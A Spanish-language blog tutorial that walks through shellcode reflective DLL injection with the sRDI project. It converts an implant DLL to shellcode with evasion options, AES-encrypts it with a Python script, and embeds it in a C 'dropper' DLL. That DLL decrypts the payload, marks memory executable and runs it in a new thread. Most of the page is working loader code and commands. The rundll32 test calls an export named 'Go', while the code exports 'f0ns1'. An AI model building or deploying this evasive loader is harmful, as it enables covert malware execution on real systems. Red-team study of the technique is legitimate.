---
layout: default
---

# Inyección de DLL en un proceso

Hasta aqui todo bien, por el momento, si has seguido el blog los procesos han inyectado payloads o shellcode, en su mismo contexto de memoria o el mapa de memoria de otro proceso. Pero ¿Que ocurre si lo que queremos es inyectar una DLL dentro de un proceso? ¿Es posible?, Si claro.

Esiste una técnica, que da una evolución de las DLL reflectivas y que como funcionalidad principal nos permite, transformar una DLL a shellCode. Esto proporciona multiples posibilidades a la hora de inyectar payloads en procesos, dado que este payload puede ser un programa completo.

# sRDI el proyecto

Se puede encontrar todo el proyecto para esta funcionalidad, en los siguientes enlaces:

[Github Repositorio](https://github.com/monoxgas/sRDI)
[NETSPI blog](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/)

Agradecimeintos en este caso para Nick Landers @monogax, por proporcionarnos esta posibilidad de aumentar el valor de las DLL reflectivas.

# Digrama de flujo

El diagrama de flujo de la ejecución mas sencillo que podemos realizar lo expongo a continuación:

![sRDI Diagram](/assets/images/sRDI_diagram.png)


# Uso de las sRDI para una DLL reflectiva

Partiendo del código fuente que utilizamos en [Reflective DLL](./DLL_reflectivas.html)
```
regsvr32.exe implant_no_entry.dll
```

![Test_sRDI_1](/assets/images/Test_sRDI_1.png)

Utilizaremos el código en python del proyecto sRDI para transformar nuestra DLL en un payload o shellcode:

```
python sRDI\Python\ConvertToShellcode.py implant_no_entry.dll -i -d 1 -f f0ns1
Creating Shellcode: implant_no_entry.bin
```

Los parámetros -i y -d son para la obfuscación del código fuente e incrementarle un delay para la ejecución que se utilizan como técnicas de evasión pero no son necesarios.
El parámetro -f será la función de entrada de para la ejecución de la DLL

Tal y como se puede observar nos devuelve un blob o binario que tiene las siguiente estrestructira:

![sRDI Architecture](/assets/images/sRDI_shellcode_arch.png)

Imagen obtenida del enlace `NETSPI blog`

El siguiente punto será encriptar de forma simétrica con el algoritmo AES, tal y como hemos visto en post anetriores el contenido del shellcode para alojarlo en el código fuente, que será desencriptado antes de alojarse en memoria. 
Para realizar esto se utiliza el siguiente código en python:

```python
import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
```
Ejecución:
```
python aes.py implant_no_entry.bin > implant_sRDI.txt
```
![Keys](/assets/images/Test_sRDI_2.png)

Y el último punto será incluirlo dentro de nuestro código inyector o dropper:

```c
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }      
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        return 0;
}

unsigned char key[] = ;// {KEY}
unsigned char payload[] = ;//{Payload}

extern "C" __declspec(dllexport) void f0ns1(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
	unsigned int payload_len = sizeof(payload);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
	}

}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

Se reduce a un código tan simple como una DLL que inyecta en memoria otra DLL.

Pues ya solo queda compilar y el código y probarlo.
```
rundll32.exe implant2.dll,Go
```

![Keys](/assets/images/Test_sRDI_3.png)



[Back](./)